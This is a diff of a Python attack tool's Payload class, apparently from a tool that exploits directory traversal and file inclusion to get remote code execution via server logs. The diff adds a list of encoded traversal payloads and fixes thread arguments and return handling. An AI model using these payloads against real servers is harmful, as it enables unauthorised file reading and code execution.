@@ -30,6 +30,7 @@ class Payload:
         self.stealth = stealth
         self.headers = headers
         self.cookies = cookies
+        self.rce_urls = []
         self.linux_dirTraversal = ["%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66", "&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;", "\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57"]
         # poc -> Proof Of Concept (Change it if you want)
         self.poc = poc
@@ -56,7 +57,6 @@ class Payload:
         if initiate:
             self.Attack(attempt_shell, mode, force)
         
-        self.rce_urls = []
 
 
     def InvokeShell(self, exploit, payload):
@@ -279,7 +279,7 @@ class Payload:
 
 
     # Updated check_traversal to handle both directory traversal and filter checks
-    def check_traversal(self, traversal, params=None, hitNginx=False, hitApache=False):
+    def check_traversal(self, traversal, params=None, hit=False):
         # Extract parameters from the URL
         parsed_url = urllib.parse.urlparse(self.url)
         query_params = urllib.parse.parse_qs(parsed_url.query)
@@ -338,7 +338,7 @@ class Payload:
         for traversal in self.linux_dirTraversal:
             for poc in self.poc:
                 payload = traversal + poc
-                thread = threading.Thread(target=self.check_traversal, args=(payload))
+                thread = threading.Thread(target=self.check_traversal, args=(payload, None))
                 threads.append(thread)
                 thread.start()
 
@@ -364,8 +364,6 @@ class Payload:
             else:
                 if self.verbosity > 0:
                     print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
-        if not self.rce_urls:  # Change rce to rce_urls
-            return False
         return self.rce_urls  # Change rce to rce_urls
     
     
@@ -411,8 +409,6 @@ class Payload:
                 else:
                     if self.verbosity > 0:
                         print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')
-        if len(self.rce_urls) == 0:  # Change rce to rce_urls
-            return False
         return self.rce_urls  # Change rce to rce_urls
 
 
@@ -490,7 +486,7 @@ class Payload:
                 # Combine the directory traversal path with the log path
                 traversal_path = d_path + l_path
                 # Use the check_traversal method to check for RCE
-                thread = threading.Thread(target=self.check_traversal, args=(traversal_path, False, False, True))
+                thread = threading.Thread(target=self.check_traversal, args=(traversal_path, False, True))
                 threads.append(thread)
                 thread.start()
 
@@ -515,7 +511,7 @@ class Payload:
                 # Combine the directory traversal path with the log path
                 traversal_path = d_path + l_path
                 # Use the check_traversal method to check for RCE
-                thread = threading.Thread(target=self.check_traversal, args=(traversal_path, False, False, True))
+                thread = threading.Thread(target=self.check_traversal, args=(traversal_path, None, True))
                 threads.append(thread)
                 thread.start()
 
